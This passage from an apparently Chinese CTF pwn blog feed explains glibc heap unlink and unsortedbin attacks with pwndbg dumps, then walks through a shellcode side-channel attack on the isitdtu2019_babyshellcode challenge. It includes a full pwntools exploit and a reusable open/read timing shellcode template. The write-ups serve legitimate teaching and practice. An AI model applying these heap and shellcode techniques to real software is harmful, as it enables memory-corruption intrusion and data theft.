class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559290</span><br><span class="line">Size: 0x430 (with flag bits: 0x431)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555596c0</span><br><span class="line">Size: 0x430 (with flag bits: 0x431)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559af0</span><br><span class="line">Size: 0x20510 (with flag bits: 0x20511)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/30gx 0x555555559290</span><br><span class="line">0x555555559290: 0x0000000000000000      0x0000000000000431</span><br><span class="line">0x5555555592a0: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x5555555592b0: 0x0000555555558028      0x0000555555558030</span><br><span class="line">0x5555555592c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559300: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559310: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559320: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559330: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559340: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559350: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559360: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559370: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; p &amp;chunk_list</span><br><span class="line">$2 = (uint64_t (*)[8]) 0x555555558040 &lt;chunk_list&gt;</span><br></pre></td></tr></table></figure><p>可以看到我们在chunk0内部造了一个fakechunk，size为0x420<br>我们将<code>fakechunk-&gt;fd</code>设置为<code>chunk_list-0x18</code>，将<code>fakechunk-&gt;bk</code>设置为<code>chunk_list-0x10</code>，这样一来，检查<code>FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P</code>也就通过了，因为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(chunk_list-0x18)-&gt;bk == chunk_list-0x18+0x18 == chunk_list == (chunk_list-0x10)-&gt;fd == chunk_list-0x10+0x10</span><br></pre></td></tr></table></figure><p><code>chunk_list[0]</code>索引的正是这里的<code>P</code><br>然后我们还需要修改后续chunk1的<code>presize</code>，因为是通过其<code>presize</code>来定位前一个<code>chunk</code>的堆头的，然后还要设置其<code>previous_in_use</code>位为false，以便于让fakechunk看起来是一个free的chunk</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/30gx 0x5555555596c0</span><br><span class="line">0x5555555596c0: 0x0000000000000420      0x0000000000000430</span><br><span class="line">0x5555555596d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555596e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555596f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559700: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559710: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559720: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559730: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559740: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559750: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559760: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559770: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559780: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559790: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555597a0: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>这样一来便绕过了<code>size vs. prev_size</code>的检查（前面已经设置fakechunk的<code>size(with flag bits)</code>为0x421），这时候只需<code>free</code>掉chunk1，就会触发<code>unlink</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd-&gt;bk = bk;</span><br><span class="line">bk-&gt;fd = fd;</span><br></pre></td></tr></table></figure><p>我们看实际效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/2gx chunk_list</span><br><span class="line">0x555555558040 &lt;chunk_list&gt;:    0x0000555555558028      0x00005555555596d0</span><br></pre></td></tr></table></figure><p>可以看到<code>chunk_list[0]</code>被写入了<code>chunk_list-0x18</code>，这时候我们其实就可以利用这个全局<code>chunk_list</code>来进行任意地址写了<br>看demo中的简单利用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> victim_str[<span class="number">8</span>] = <span class="string">&quot;victim&quot;</span>;</span><br><span class="line"><span class="type">char</span> hacked[<span class="number">8</span>] = <span class="string">&quot;hacked&quot;</span>;</span><br><span class="line">*((<span class="type">uint64_t</span>*)chunk_list[<span class="number">0</span>]+<span class="number">3</span>) = (<span class="type">uint64_t</span>) victim_str;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;------- original vaule of victim_str is -------\n%s\n&quot;</span>, victim_str);</span><br><span class="line"><span class="built_in">strcpy</span>((<span class="type">char</span>*)chunk_list[<span class="number">0</span>], hacked);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;------- new vaule of victim_str is      -------\n%s\n&quot;</span>, victim_str);</span><br></pre></td></tr></table></figure><p><code>*((uint64_t*)chunk_list[0]+3)</code>其实就是<code>((uint64_t*)chunk_list[0])[3]</code>，这里也就是向<code>chunk_list-0x18+0x18</code>也就是<code>chunk_list[0]</code>写入一个地址，后续使用<code>chunk_list[0]</code>来进行写入的时候，也就实现了任意地址写<br>看最后demo运行效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">------- original vaule of victim_str is -------</span><br><span class="line">victim</span><br><span class="line">------- new vaule of victim_str is      -------</span><br><span class="line">hacked</span><br></pre></td></tr></table></figure><h2 id="0x02-关于unsortedbin-attack"><a href="#0x02-关于unsortedbin-attack" class="headerlink" title="0x02 关于unsortedbin attack"></a>0x02 关于unsortedbin attack</h2><p>稍微回顾一下, <code>unsorted bin</code>也是以双向链表的方式进行组织的，和<code>fastbin</code>不同的是其分配方式是<code>FIFO</code>，即一个chunk放入<code>unsorted bin</code>链时将该堆块插入链表头，而从这个链取堆块的时候是从尾部开始的，因此<code>unsorted bin</code>遍历堆块的时候使用的是<code>bk</code>指针<br><code>unsortedbin attack</code>其实也是利用<code>unlink</code>操作，我们看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>这里换而言之，如果我们控制了 <code>bk</code> 的值，我们就能将 <code>unsorted_chunks (av)</code> 写到任意地址<br>这个<code>unsorted_chunks (av)</code>的值，其实是<code>main_arena</code>的某个偏移处，可以修改<code>global_max_fast</code>，或者向题目存在的<code>chunk_list</code>写入<code>main_arena</code>地址<br>然而在高版本加入双向链表完整性检查机制后，这基本已经被宣判了死刑，关于<code>unsortedbin</code>使用的更多的一般是<code>unsortedbin leak</code>了，所以不再赘述</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
          <category> unsortedbin attack </category>
          
          <category> unlink </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录一次侧信道攻击</title>
      <link href="/2025/08/11/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/"/>
      <url>/2025/08/11/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-关于侧信道攻击"><a href="#0x00-关于侧信道攻击" class="headerlink" title="0x00 关于侧信道攻击"></a>0x00 关于侧信道攻击</h2><p>侧信道攻击（Side-Channel Attack）是一类不直接破解算法本身，而是通过分析系统在运行过程中泄露的物理信息来推测机密数据的攻击方式。<br>常见的侧信道信息包括：<br>时间（Time）：执行时间的差异可能泄露数据，比如加密运算时间与密钥值有关。<br>功耗（Power）：芯片运算时功耗变化可反推出密钥（DPA&#x2F;SPA）。<br>电磁辐射（EM）：运行时发出的电磁波可被采集分析。<br>声学（Acoustic）：设备运行的声音差异可能泄露信息（如打印机、键盘声）。<br>缓存行为（Cache）：缓存命中&#x2F;缺失模式可被利用（如 Spectre、Meltdown）。<br> —- 摘取自ChatGPT-5</p><h2 id="0x01-pwn中的侧信道爆破"><a href="#0x01-pwn中的侧信道爆破" class="headerlink" title="0x01 pwn中的侧信道爆破"></a>0x01 pwn中的侧信道爆破</h2><p>在pwn中，侧信道攻击的主要应用通常就是shellcode领域的侧信道爆破<br>什么时候使用侧信道爆破呢？在能使用shellcode直接getshell时当然不需要，在沙箱环境下可以orw时候自然也不需要，然而，如果<code>write</code>也被禁用怎么办呢？这时候就可以使用侧信道爆破了<br>我们使用<code>open</code>和<code>read</code>来讲flag读取到一片可读写的内存上，然后布置一段爆破flag的shellcode<br>我们通过cmp指令来判断给出的一个字符和flag的对应位是否相同，相同则跳回cmp指令处，这样如果这一位正确，那么程序便会进入死循环，我们判断一秒内是否接收到信息来判断程序是否死循环，便得知这一位是否正确</p><h2 id="0x02-isitdtu2019-babyshellcode"><a href="#0x02-isitdtu2019-babyshellcode" class="headerlink" title="0x02 isitdtu2019_babyshellcode"></a>0x02 isitdtu2019_babyshellcode</h2><p>参考<a href="https://www.roderickchan.cn/zh-cn/2021-12-11-isitdtu2019-babyshellcode/">Isitdtu2019_babyshellcode | roderick - record and learn!</a> (<del>似乎就是提出house of apple的大师傅</del>)<br>先放题目</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 __fastcall <span class="title function_">sub_AA0</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  __int128 v10; <span class="comment">// [rsp-8h] [rbp-20h] BYREF</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+8h] [rbp-10h] BYREF</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+10h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v11 = a2;</span><br><span class="line">  *((_QWORD *)&amp;v10 + <span class="number">1</span>) = a3;</span><br><span class="line">  v12 = <span class="number">0x67616C662FL</span>L;</span><br><span class="line">  result = sys_access((<span class="type">const</span> <span class="type">char</span> *)&amp;v12, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = sys_mmap(<span class="number">0xCAFE000u</span>LL, <span class="number">0x1000u</span>LL, <span class="number">7uLL</span>, <span class="number">0x32u</span>LL, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">    v11 = <span class="number">0x67616C662FL</span>L;</span><br><span class="line">    v5 = sys_open((<span class="type">const</span> <span class="type">char</span> *)&amp;v11, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    v6 = sys_read(v5, (<span class="type">char</span> *)<span class="number">0xCAFE000</span>, <span class="number">0x30u</span>LL);</span><br><span class="line">    BYTE13(v10) = <span class="number">0</span>;</span><br><span class="line">    HIWORD(v10) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *)&amp;v10, <span class="string">&quot;/dev/urandom&quot;</span>);</span><br><span class="line">    v7 = sys_read(sys_open((<span class="type">const</span> <span class="type">char</span> *)&amp;v10, <span class="number">0</span>, <span class="number">0</span>), (<span class="type">char</span> *)<span class="number">0xCAFE050</span>, <span class="number">8uLL</span>);</span><br><span class="line">    v8 = MEMORY[<span class="number">0xCAFE050</span>];</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">212852736LL</span>; i &lt; <span class="number">0xCAFE030</span>; i += <span class="number">8LL</span> )</span><br><span class="line">      *(_QWORD *)i ^= v8;</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">    MEMORY[<span class="number">0xCAFE050</span>] = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里将flag读取到了<code>0xCAFE000</code>，然后取了八字节随机值存储于<code>0xCAFE050</code>作为<code>key</code>，接着将<code>flag</code>每八字节异或<code>key</code>，是一个非常简单的加密，异或是可逆的<br>我们这里有一个预先信息就是<code>flag</code>是GUID值，那么<code>flag</code>长度便是0x2a，并且<code>flag&#123;&#125;</code>中的值只可能是<code>0123456789abcdef-</code>中的一个（此题的特例，正常如果未知的话还是要爆破所有可打印字符的）<br>那么我们的思路就是先还原出<code>key</code>，再利用<code>key</code>来还原<code>flag</code><br>我们知道<code>flag</code>的前四字节肯定是“flag”，那么将<code>0xCAFE000</code>的前四字节异或上”flag”便可以还原出<code>key</code>的前四字节，然后由于<code>flag</code>的长度原因，其0x30的空间并没有全部填满，后续都是0，那么与0异或是不会改变原值的，那么<code>0xCAFE000</code>到<code>0xCAFE030</code>的最后四字节便是<code>key</code>，于是我们得到了<code>key</code>，那么再对<code>0xCAFE000</code>到<code>0xCAFE030</code>每八字节按位异或<code>key</code>便还原了<code>flag</code>，接下来就是侧信道爆破了<br>主函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *dest; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  dest = (<span class="type">char</span> *)mmap(<span class="number">0LL</span>, <span class="number">0x1000u</span>LL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( dest == (<span class="type">char</span> *)<span class="number">-1LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;Could not mmap&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_BFA();</span><br><span class="line">    <span class="built_in">memcpy</span>(dest, &amp;unk_202020, <span class="number">0x27u</span>LL);</span><br><span class="line">    sub_C39(dest + <span class="number">39</span>, <span class="number">70LL</span>);</span><br><span class="line">    sub_BB5();</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))dest)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是执行我们输入的shellcode，但是禁止了除了alarm以外的系统调用，我们可以先调用alarm将时间限制取消<br>注意<code>unk_202020</code>处的指令会先执行，将寄存器基本全部清空了<br>我们直接放exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;pwn_patched&quot;</span></span><br><span class="line">libcname = <span class="string">&quot;/home/r3t2/.config/cpwn/pkgs/2.27-3ubuntu1.6/amd64/libc6_2.27-3ubuntu1.6_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">host = <span class="string">&quot;node5.buuoj.cn&quot;</span></span><br><span class="line">port = <span class="number">27189</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b main</span></span><br><span class="line"><span class="string">set debug-file-directory /home/r3t2/.config/cpwn/pkgs/2.27-3ubuntu1.6/amd64/libc6-dbg_2.27-3ubuntu1.6_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/r3t2/.config/cpwn/pkgs/2.27-3ubuntu1.6/amd64/glibc-source_2.27-3ubuntu1.6_all/usr/src/glibc/glibc-2.27</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.P:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line">    <span class="keyword">elif</span> args.R:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript = gs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = start()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Your exploit here</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov al, 0x25</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov ebp, 0xcafe000</span></span><br><span class="line"><span class="string">    mov eax, dword ptr [rbp]</span></span><br><span class="line"><span class="string">    xor eax, 0x67616c66</span></span><br><span class="line"><span class="string">    mov ebx, dword ptr [rbp+0x2c]</span></span><br><span class="line"><span class="string">    shl rbx, 32</span></span><br><span class="line"><span class="string">    or rbx, rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">L1:</span></span><br><span class="line"><span class="string">    xor qword ptr [rbp + 8 * rdx], rbx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    cmp dl, 6</span></span><br><span class="line"><span class="string">    jnz L1</span></span><br><span class="line"><span class="string">L2:</span></span><br><span class="line"><span class="string">    cmp byte ptr [rbp + &#123;&#125;], &#123;&#125;</span></span><br><span class="line"><span class="string">    jz L2</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">idx = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x2a</span>):</span><br><span class="line">    err = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bytearray</span>(<span class="string">b&quot;-&#123;&#123;&#125;&#125;flagbcde0123456789&quot;</span>):</span><br><span class="line">        io = start()</span><br><span class="line">        io.send(asm(shellcode.<span class="built_in">format</span>(idx, <span class="built_in">hex</span>(i))))</span><br><span class="line">        <span class="keyword">if</span> io.can_recv_raw(<span class="number">1</span>):</span><br><span class="line">            io.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag += <span class="built_in">chr</span>(i)</span><br><span class="line">            log.success(<span class="string">f&quot;got flag --&gt; <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            io.close()</span><br><span class="line">            err = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> err:</span><br><span class="line">        error(<span class="string">&quot;This round is wrong!&quot;</span>)</span><br><span class="line">    idx += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">L2:</span><br><span class="line">    cmp byte ptr [rbp + &#123;&#125;], &#123;&#125;</span><br><span class="line">    jz L2</span><br></pre></td></tr></table></figure><p>这里就是取我们尝试字符与<code>flag</code>的对应位置比较，如果正确则继续比较，这样就会陷入死循环<br>然后这里</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> io.can_recv_raw(<span class="number">1</span>):</span><br></pre></td></tr></table></figure><p><code>io.can_recv_raw(timeout)</code>是用于检测timeout时间内是否有套接字可读，我们可以很方便的用于判断程序是否在死循环</p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>orw缺w进行侧信道爆破的模版</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    push 0x67616c66          # 将字符串 &#x27;flag&#x27; 的 ASCII 值（逆序）压入栈中（0x67616c66 是 &#x27;flag&#x27; 的十六进制表示，注意低字节优先）</span><br><span class="line">    mov rdi, rsp             # 将栈顶的地址（即 &#x27;flag&#x27; 的地址）加载到 rdi 中，作为 open() 的文件名参数</span><br><span class="line">    xor esi, esi             # 将 esi 清零，等价于将 rsi 置为 0，表示文件权限为只读 (O_RDONLY)</span><br><span class="line">    push 2                   # 将常数 2 压入栈，用于设置 rax 的值为 2（open 系统调用号）</span><br><span class="line">    pop rax                  # 从栈中弹出值 2 到 rax 中，设置 rax = 2（即 open() 系统调用号）</span><br><span class="line">    syscall                  # 执行 syscall，调用 open()，打开 &#x27;flag&#x27; 文件</span><br><span class="line">                             # 如果文件成功打开，文件描述符存储在 rax 中</span><br><span class="line"></span><br><span class="line">    mov rdi, rax             # 将文件描述符（即 open() 返回的 rax 值）存入 rdi，作为 read() 的文件描述符参数</span><br><span class="line">    mov rsi, rsp             # 将栈顶地址存入 rsi，作为 read() 的缓冲区参数</span><br><span class="line">    mov edx, 0x100           # 设置 edx = 0x100（即 256），表示最多读取 256 字节</span><br><span class="line">    xor eax, eax             # 清零 rax，设置 rax = 0，表示调用 read() 系统调用</span><br><span class="line">    syscall                  # 执行 syscall，调用 read()，读取文件内容到栈上的缓冲区</span><br><span class="line"></span><br><span class="line">    mov dl, [rsp + &#123;&#125;]       # 将栈中偏移 &#123;&#125; 处的一个字节加载到 dl 中，注意 &#123;&#125; 是动态参数（偏移值）</span><br><span class="line">    cmp dl, &#123;&#125;               # 比较 dl 中的值和 &#123;&#125;（即传入的常量值），注意 &#123;&#125; 是动态参数（要比较的值）</span><br><span class="line">    jbe $                    # 如果 dl 的值小于等于传入的常量值 &#123;&#125;，就陷入死循环（$ 表示当前指令地址，导致无限循环）</span><br><span class="line">    &quot;&quot;&quot;.format(i, c)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>根据具体情境相应调整<br>然后给出一版二分法优化的版本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 